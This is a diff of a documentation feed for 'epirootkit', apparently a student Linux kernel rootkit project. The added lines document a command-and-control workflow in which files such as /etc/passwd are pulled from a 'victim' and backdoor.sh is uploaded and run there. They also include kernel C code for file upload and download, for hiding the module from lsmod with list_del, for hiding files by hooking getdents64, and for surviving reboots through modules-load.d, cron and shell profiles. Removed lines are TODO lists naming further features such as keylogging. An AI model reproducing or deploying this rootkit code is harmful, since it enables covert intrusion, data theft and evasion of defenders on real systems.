+&lt;li>&lt;strong>File creation&lt;/strong>: Uses &lt;code>O_WRONLY | O_CREAT | O_TRUNC&lt;/code> flags&lt;/li>
+&lt;li>&lt;strong>Permissions&lt;/strong>: Files created with 0644 permissions&lt;/li>
+&lt;li>&lt;strong>Size limits&lt;/strong>: 10MB maximum file size&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Stealth Hooks &amp; daniel.* Commands</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 11 May 2025 18:25:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h2 id="todo-implement-stealth--hiding-features">TODO: Implement Stealth &amp;amp; Hiding Features &lt;a href="#todo-implement-stealth--hiding-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input disabled="" type="checkbox"> Hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code> to hide files and directories&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Hide kernel module from &lt;code>/proc/modules&lt;/code> and &lt;code>lsmod&lt;/code>&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement PID hiding via dynamic list&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement stealth command channel via &lt;code>rmdir()&lt;/code>&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add privilege escalation and config dump commands&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test all hiding features and document limitations&lt;/li>
+&lt;h2 id="download-feature">Download Feature &lt;a href="#download-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage-1">Basic Usage &lt;a href="#basic-usage-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="390b28f" class="language-bash ">
+ &lt;code># Download to specific local path
+c2-server$ download Client-1 /etc/passwd ./victim_passwd
+# ✓ File downloaded successfully (2048 bytes)
+
+# Download to current directory (uses basename)
+c2-server$ download Client-1 /etc/hostname
+# ✓ File downloaded successfully (64 bytes) -&amp;gt; ./hostname&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="real-examples">Real Examples &lt;a href="#real-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system-files">System Files &lt;a href="#system-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="72e8c6f" class="language-bash ">
+ &lt;code># Download system configuration
+c2-server$ download Client-1 /etc/passwd
+# ✓ File downloaded successfully (2048 bytes)
+# Content: root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# ...
+
+# Download network configuration
+c2-server$ download Client-1 /etc/hosts
+# ✓ File downloaded successfully (256 bytes)
+# Content: 127.0.0.1	localhost
+# 127.0.1.1	victim
+# ...&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="upload-scripts">Upload Scripts &lt;a href="#upload-scripts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="170915d" class="language-bash ">
+ &lt;code># Upload a shell script
+c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
+# ✓ File uploaded successfully (1024 bytes)
+
+# Make it executable (via exec command)
+c2-server$ exec Client-1 chmod &amp;#43;x /tmp/backdoor.sh
+# Exit code: 0
+
+# Run the script
+c2-server$ exec Client-1 /tmp/backdoor.sh
+# Exit code: 0
+# Output: Backdoor installed successfully&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-handler">Upload Handler &lt;a href="#upload-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="66de7a3" class="language-c ">
+ &lt;code>static int handle_upload(const char *data)
+{
+ char *filename, *file_content, *separator;
+ struct file *file;
+ loff_t pos = 0;
+ ssize_t bytes_written;
+ 
+ // Parse filename:content format
+ separator = strchr(data, &amp;#39;:&amp;#39;);
+ *separator = &amp;#39;\0&amp;#39;;
+ filename = data;
+ file_content = separator &amp;#43; 1;
+ 
+ // Validate filename
+ if (!validate_filename(filename))
+ return send_error(&amp;#34;Invalid or unsafe filename&amp;#34;);
+ 
+ // Create and write file
+ file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+ bytes_written = kernel_write(file, file_content, content_length, &amp;amp;pos);
+ filp_close(file, NULL);
+ 
+ return send_success(&amp;#34;File uploaded successfully&amp;#34;);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="download-handler">Download Handler &lt;a href="#download-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="5d2c29c" class="language-c ">
+ &lt;code>static int handle_download(const char *data)
+{
+ struct file *file;
+ loff_t file_size, pos = 0;
+ char *file_content, *result_buffer;
+ ssize_t bytes_read;
+ 
+ // Open file
+ file = filp_open(data, O_RDONLY, 0);
+ if (IS_ERR(file))
+ return send_error(&amp;#34;File not found or cannot be opened&amp;#34;);
+ 
+ // Check file size
+ file_size = i_size_read(file_inode(file));
+ if (file_size &amp;gt; MAX_FILE_SIZE) {
+ filp_close(file, NULL);
+ return send_error(&amp;#34;File too large to download&amp;#34;);
+ }
+ 
+ // Read file content
+ file_content = vmalloc(file_size &amp;#43; 1);
+ bytes_read = kernel_read(file, file_content, file_size, &amp;amp;pos);
+ file_content[bytes_read] = &amp;#39;\0&amp;#39;;
+ 
+ // Format response
+ result_buffer = vmalloc(file_size &amp;#43; 32);
+ snprintf(result_buffer, file_size &amp;#43; 32, &amp;#34;DOWNLOAD:%s&amp;#34;, file_content);
+ 
+ return send_result(result_buffer);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f8baefd" class="language-c ">
+ &lt;code>// rootkit/core/config.h
+#define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB
+#define MAX_FILENAME_LENGTH 255&lt;/code>
+ &lt;/pre>
+ &lt;/div></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module and files from system detection using kernel hooking techniques.&lt;/p>
+&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Hide from &lt;code>lsmod&lt;/code>&lt;/strong>: Remove module from kernel module list&lt;/li>
+&lt;li>&lt;strong>Hide from &lt;code>/proc/modules&lt;/code>&lt;/strong>: Module not visible in procfs&lt;/li>
+&lt;li>&lt;strong>Dynamic control&lt;/strong>: Toggle visibility via C2 commands&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p>
-&lt;h1 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-We hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code>.&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;h2 id="todo-implement-password-protection-features">TODO: Implement Password Protection Features &lt;a href="#todo-implement-password-protection-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Add password-based authentication for rootkit commands&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Store password hashes securely&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement password change and reset mechanisms&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document password protection and security best practices&lt;/li>
-&lt;/ul></description></item><item><title>Encrypted C2, Persistence &amp; Auth</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 11 May 2025 18:30:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h2 id="todo-implement-persistence--auth-features">TODO: Implement Persistence &amp;amp; Auth Features &lt;a href="#todo-implement-persistence--auth-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement encrypted C2 heartbeat and reconnection logic&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add autoload on boot (persistence) via module config&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Implement password protection for sensitive commands&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Store and verify password hashes securely&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Test persistence and authentication on supported systems&lt;/li>
+&lt;h3 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Hide by prefix&lt;/strong>: Files with specific prefixes are hidden&lt;/li>
+&lt;li>&lt;strong>Directory listing&lt;/strong>: Intercept &lt;code>getdents64&lt;/code> syscall&lt;/li>
+&lt;li>&lt;strong>Automatic hiding&lt;/strong>: Enabled by default when module loads&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Symbol Resolution &amp; Ftrace Hooks</title><link>/docs/04-epirootkit/features/symbol-ftrace/</link><pubDate>Sun, 11 May 2025 18:20:00 +0100</pubDate><guid>/docs/04-epirootkit/features/symbol-ftrace/</guid><description>&lt;h2 id="todo-implement-symbol-resolution--ftrace-hooks">TODO: Implement Symbol Resolution &amp;amp; Ftrace Hooks &lt;a href="#todo-implement-symbol-resolution--ftrace-hooks" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement dynamic symbol resolution (e.g., &lt;code>kallsyms_lookup_name&lt;/code>)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add ftrace-based syscall hooking&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Ensure safe registration/unregistration of hooks&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document implementation and kernel compatibility&lt;/li>
-&lt;/ul></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;h2 id="todo-implement-bonus-features">TODO: Implement Bonus Features &lt;a href="#todo-implement-bonus-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input disabled="" type="checkbox"> Add rootkit upgrade mechanism&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement packet hiding and keylogging&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add network traffic redirection&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement NGL clone with the backdoor&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document and test all bonus features&lt;/li>
+&lt;h2 id="module-hiding-1">Module Hiding &lt;a href="#module-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Find module&lt;/strong>: Locate rootkit in kernel module list&lt;/li>
+&lt;li>&lt;strong>Remove from list&lt;/strong>: Use &lt;code>list_del()&lt;/code> to remove from &lt;code>modules&lt;/code> list&lt;/li>
+&lt;li>&lt;strong>Store reference&lt;/strong>: Keep pointer to restore later&lt;/li>
+&lt;li>&lt;strong>Toggle visibility&lt;/strong>: Can hide/unhide dynamically&lt;/li>
+&lt;/ol>
+&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c21c383" class="language-c ">
+ &lt;code>int hide_module(void)
+{
+ struct module *mod;
+ 
+ mutex_lock(&amp;amp;module_mutex);
+ list_for_each_entry(mod, &amp;amp;modules, list) {
+ if (mod == THIS_MODULE) {
+ stealth_state.prev_module_entry = mod-&amp;gt;list.prev;
+ list_del(&amp;amp;mod-&amp;gt;list);
+ stealth_state.module_hidden = true;
+ break;
+ }
+ }
+ mutex_unlock(&amp;amp;module_mutex);
+ return 0;
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="18156bf" class="language-bash ">
+ &lt;code># Hide the module
+c2-server$ config Client-1
+# Select: Toggle Module Hiding
+# ✓ Module hidden
+
+# Verify hiding (from victim system)
+victim$ lsmod | grep epirootkit
+# (no output - module is hidden)
+
+# Check status
+c2-server$ status Client-1
+# Module Hidden: YES&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="detection-evasion">Detection Evasion &lt;a href="#detection-evasion" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>&lt;code>lsmod&lt;/code> command&lt;/strong>: Module not listed&lt;/li>
+&lt;li>&lt;strong>&lt;code>/proc/modules&lt;/code>&lt;/strong>: Entry removed from procfs&lt;/li>
+&lt;li>&lt;strong>System monitoring&lt;/strong>: Most tools rely on these sources&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Overview</title><link>/docs/06-web-ui/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/main-dashboard.png"
+&lt;h2 id="file-hiding-1">File Hiding &lt;a href="#file-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works-1">How It Works &lt;a href="#how-it-works-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Hook &lt;code>getdents64&lt;/code>&lt;/strong>: Use kretprobe to intercept directory listings&lt;/li>
+&lt;li>&lt;strong>Filter entries&lt;/strong>: Remove files with configured prefixes&lt;/li>
+&lt;li>&lt;strong>Modify buffer&lt;/strong>: Adjust directory entry buffer&lt;/li>
+&lt;li>&lt;strong>Return filtered&lt;/strong>: Send modified listing to userspace&lt;/li>
+&lt;/ol>
+&lt;h3 id="hidden-file-prefixes">Hidden File Prefixes &lt;a href="#hidden-file-prefixes" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Files starting with these prefixes are automatically hidden:&lt;/p></description></item><item><title>Persistence</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
+&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-persistence-mechanisms">Three Persistence Mechanisms &lt;a href="#three-persistence-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>modules-load.d&lt;/strong>: Systemd automatic module loading&lt;/li>
+&lt;li>&lt;strong>Cron Jobs&lt;/strong>: Scheduled module loading via cron&lt;/li>
+&lt;li>&lt;strong>Shell Profiles&lt;/strong>: Load via user login scripts&lt;/li>
+&lt;/ol>
+&lt;h3 id="automatic-installation">Automatic Installation &lt;a href="#automatic-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>On module load&lt;/strong>: All persistence mechanisms installed automatically&lt;/li>
+&lt;li>&lt;strong>Dynamic control&lt;/strong>: Install/remove via C2 commands&lt;/li>
+&lt;li>&lt;strong>Individual control&lt;/strong>: Manage each mechanism separately&lt;/li>
+&lt;/ul>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-installation-1">Automatic Installation &lt;a href="#automatic-installation-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically installs all persistence mechanisms:&lt;/p></description></item><item><title>README</title><link>/docs/06-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/06-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/main-dashboard.png"
  alt="Web UI">
 &lt;/figure>
 
